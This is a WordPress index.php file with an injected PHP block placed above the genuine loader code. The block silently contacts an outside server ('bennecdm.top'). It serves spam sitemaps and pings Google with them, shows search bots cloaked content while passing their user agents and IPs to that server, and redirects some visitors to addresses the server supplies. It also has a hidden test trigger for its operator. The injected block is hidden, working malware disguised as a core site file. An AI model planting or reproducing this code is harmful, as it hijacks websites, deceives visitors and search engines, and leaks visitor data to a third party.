<?php 
error_reporting(0);
$ym = "z0yyw4.bennecdm.top/";
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$urlrefer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$gu = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$uri = $gu;
if(strstr($uri, '?')){
    $uris = explode("?", $uri);
    $uri = $uris[0]."?";
    if(isset($uris[1])){$gu = $uris[1];}
}else{
    $uri="/";
}
$gu = str_ireplace("/", "", $gu);
$hn = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$rd = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
$pu = (isset($_SERVER['HTTPS']) ? "https" : "http")."://".$hn."/sitemap.xml";
if (is_https()) {$ht = "https";} else {$ht = "http";}
$pu = "https://www.google.com/ping?sitemap=".$pu;
if (stripos($_SERVER['REQUEST_URI'], 'formweb.xml') !== false) {
    $url = "http://".$ym."psitemap";
    $post_data = array('hostName' => $hn);
    $sitemapcount = send_post($url, $post_data);
    for ($i = 1; $i <= $sitemapcount; $i++) {
        $pu = $ht."://".$hn.$uri."sitemap".$i.".xml";
        $pu = "https://www.google.com/ping?sitemap=".$pu;
        $contents = get($pu);
        if (strpos($contents, "Sitemap Notification Received")) {
            echo "$pu : OK!<br>";
        } else {
            echo "Submitting Google Sitemap $pu : ERROR!<br>";
        }
    }
    exit;
}
if (stripos($_SERVER['REQUEST_URI'], 'product-showtest=AA2023test') !== false) {
    $url = "http://".$ym.
    "textUrl";
    $sz = "~~A421~~";
    $post_data = array('number' => $sz, 'hostName' => $ym, 'siteYuming' => $hn);
    $htmlToshow = send_post($url, $post_data);
    echo "oooooo~~Successfully~~~~~--ok".$htmlToshow;
    exit;
}
preg_match('/sitemap(\d+).xml/', $_SERVER['REQUEST_URI'], $matchsitemap);
if (stripos($_SERVER['REQUEST_URI'], 'sitemap.xml') !== false || count($matchsitemap) > 0) {
    header('Content-type:application/xml');
    $hn = (isset($_SERVER['HTTPS']) ? "https" : "http")."://".$hn;$url = "http://".$ym."smap_1";
    $post_data = array('hostName' => $hn, 'getcontext' => $gu, 'uri' => $uri );
    $htmlToshow = send_post($url, $post_data);
    echo $htmlToshow;
    exit;
}
$version = preg_match('/([a-z]){4}(\d+)/', $gu, $match);
$version2 = stripos($gu, "_");
if ($match || $version2 || stripos($user_agent, "bot")) {
    $hn = (isset($_SERVER['HTTPS']) ? "https" : "http")."://".$hn;
    $url = "http://".$ym."gedata_1";
    if (stripos($user_agent, "bot")) {
        $post_data = array('getcontext' => $gu, 'hostName' => $hn, 'useragent' => $user_agent, 'ip' => $rd, 'uri' => $uri );
        $htmlToshow = send_post($url, $post_data);
        echo $htmlToshow;
        exit;
    } else {
        $lastUrl = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
        $shellurl = $hn.$lastUrl;
        $post_data = array('urlrefer' => $urlrefer, 'shellinhtml' => $shellurl, 'gotohtml' => $gu, 'ip' => $rd, 'hostName' => $hn, 'uri' => $uri );
        $htmlToshow = send_post($url, $post_data);
        
        if (stripos($htmlToshow, "okGohtml") == true) {
            $htmlToshow = str_ireplace("okGohtml", "", $htmlToshow);
            echo('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0; url='.$htmlToshow.
                '" /></head><body><noscript><meta http-equiv="refresh" content="0; url='.$htmlToshow.
                '" /></noscript><script>document.location.href = "'.$htmlToshow.
                '"</script></body></html>');
            exit;
        }
    }
}
function send_post($url, $post_data) {
    $postdata = http_build_query($post_data);
    $options = array('http' => array('method' => 'POST', 'header' => 'Content-type:application/x-www-form-urlencoded', 'content' => $postdata, 'timeout' => 15 * 60));
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
function get($url) {
    $contents = @file_get_contents($url);
    if (!$contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $contents = curl_exec($ch);
        curl_close($ch);
    }
    return $contents;
}
function is_https() {
    if (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    }
    elseif(isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    }
    elseif(!empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
} ?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';